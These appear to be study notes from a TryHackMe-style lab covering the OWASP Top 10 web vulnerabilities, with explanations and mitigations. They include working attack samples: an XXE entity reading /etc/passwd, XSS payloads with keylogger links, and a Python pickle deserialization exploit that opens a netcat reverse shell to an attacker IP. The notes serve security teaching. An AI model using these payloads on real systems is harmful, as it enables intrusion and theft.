# Web Hacking Fundamentals


## OWASP Top 10

- Injection
- Broken Authentication
- Sensitive Data Exposure
- XML External Entity
- Broken Access Control
- Security Misconfiguration
- Cross-site Scripting
- Insecure Deserialization
- Components with Known Vulnerabilities
- Insufficent Logging & Monitoring

## Injection
- Occur because user controlled output is interpreted as actual commands or parameters by the application
- Depend on the technologies being used
	- SQL Injection - occurs when controlled input is passed to SQL queries
		- Attacker can access, modify, and delete information in a database
	- Command Injection - occurs when user input is passed to system commands
		- Attacker can execute arbitrary commands on a server
- Main defense is to ensure that user controlled input is not interpreted as queries or commands
	- When input is sent to a server, this input is compared to a list of safe input or characters, when the input is marked safe then it is processed, otherwise its rejected
	- Stripping input if dangerous characters are present
		- Dangerous characters are any input that can change how the data is processed
- OS command injection
	- When server side code in a web application makes a system call on the hosting machine
	- Attacker can take advantage of that system call to execute operating system commands

## Broken Authentication
- Authentication - allows users to gain access to web apps by verifying their identifties
	- Ex. Username and password
- Session management - create stateful connections
	- Ex. Session cookie
- If an attacker finds flaws in an authentication mechanism, they can gain access to other accounts
- Common flaws
	- Brute force attacks
	- Use of weak credentials
	- Weak session cookies
		- Can't be predictable
- Mitigation techniques
	- Ensure that the application enforces a strong password policy
	- Ensure that the application enforces an automatic lockout after a certain number of attempts
	- Implement multi factor authentication

## Sensitive Data Exposure
- When data linked directory to customers or technical information is divulged
- Ex. Database exposure

## XML External Entity
- A vulnerability that abuses features of XML parsers/data
- Allows attacker to interact with any backend that the application itself can access
- Can also cause DoS or use XXE to perform a SSRF, as well as enable port scanning and lead to RCE
- Two types of XXE
	- In-band - where attacker can receive an immediate response to XXE payload
	- Out-of-band - no immediate response and attacker has to reflect the output of XXE to some other file or their own server
- XML - markup language that defines a set of rules for encoding documents that is both human readable and machine readable
- Why is XML used?
	- Platform and programming language independent
	- Data stored and transported using XML can be changed at any point in time
	- XML allows validation using DTD and Schema
	- XML simplifies data sharing between various systems because of its platform independent nature
	- Doesn't require any conversion when transferred between different systems
- Syntax
	- XML Prolog
		- `<?xml version="1.0" encoding="UTF-8"?>`
	- Ex.
	```
	<?xml version="1.0" encoding="UTF-8"?>
	<mail>
	   <to>falcon</to>
	   <from>feast</from>
	   <subject>About XXE</subject>
	   <text>Teach about XXE</text>
	</mail>
	```
	- Can add attributes
		`<text category = "message">You need to learn about XXE</text>`
- DTD
	- DTD - Document Type Definition
		- Defines the structure and legal elements and attributes of an XML document
	- If `note.dtd` includes this content:
		```
		<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
		```
		```
		!DOCTYPE note -  Defines a root element of the document named note
		!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
		!ELEMENT to - Defines the to element to be of type "#PCDATA"
		!ELEMENT from - Defines the from element to be of type "#PCDATA"
		!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
		!ELEMENT body - Defines the body element to be of type "#PCDATA"
		```
	- Then the XML can be validated with 
		```
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE note SYSTEM "note.dtd">
		<note>
		    <to>falcon</to>
		    <from>feast</from>
		    <heading>hacking</heading>
		    <body>XXE attack</body>
		</note>
		```
- XXE Payload
	- Define an ENTITY and read a file from the system
	```
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	<root>&read;</root>
	```

## Broken Access Control
- Websites have pages that are protected from regular users, like admin pages
- If a regular visitor is able to access protected pages:
	- They can view sensitive information
	- Access unauthorized functionality
- Ex.
```
Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct

Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```

## Security Misconfiguration
- Security misconfigurations include:
	- Poorly configured permissions on cloud services, like S3 buckets
	- Having unnecessary features enabled, like services, pages, accounts or privileges
	- Default accounts with unchanged passwords
	- Error messages that are overly detailed and allow an attacker to find out more about the system
	- Not using HTTP security headers, or revealing too much detail in the Server: HTTP header
- Default passwords
	- It's common for embedded and IoT devices to have default passwords that users don't change
	- An attacker can gain access to admin dashboards, services designed for system admin or manufacturers, or even network infrastructure

## Cross-Site Scripting
- A vuln found in web applications
- An injection that can allow an attacker to execute malicious scripts on the victim's machine
- Possible with JS, VBScript, Flash, and CSS
- 3 types:
	- Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
	- Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
	- DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
- XSS payloads
	- Popup's `<script>alert(“Hello World”)</script>` - Creates a Hello World message popup on a users browser.
	- Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
	- XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
	- Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

## Insecure Deserialization
- Replacing data processed by an application with malicious code, allowing anything from DoS to RCE
- Characteristics
	- Low exploitability - the vulnerability is often a case-by-case basis, there is no reliable tool/framework for it. Attackers need to have a good understanding of the inner workings of the techonology
	- Exploit is only as dangerous as the attacker's skill permits and the value of the data exposed
- What's vulnerable?
	- Anything that stores or fetches data where there are no validations or integrity checks in place for data queried or retained
	- E-commerce sites
	- Forums
	- APIs
	- Application runtimes
- Serialization - the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage
- Ex.
	- A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.
	- Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.
- Python pickles example
```
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

## Components With Known Vulnerabilities
- Companies may be using software that have well documented vulnerabilities
- Exploits can be found on exploit-db

## Insufficient Logging and Monitoring
- When web applications are set up, every action performed by the user should be logged, which will allow attackers' actions to be traced
- Impacts:
	- Regulatory damage - if an attacker has gained personally identifiable user information and there is no record of this, then users are affected and owners of application may be subject to legal action
	- Risk of further attacks - if the attack was undetected then they could launch further attacks
- Information should include:
	- HTTP status codes
	- Time Stamps
	- Usernames
	- API endpoints/page locations
	- IP addresses
- The logs have important information so it's important to store them securely and have backups
- Examples of suspicious activity
	- Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)
	- Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
	- Use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
	- Common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
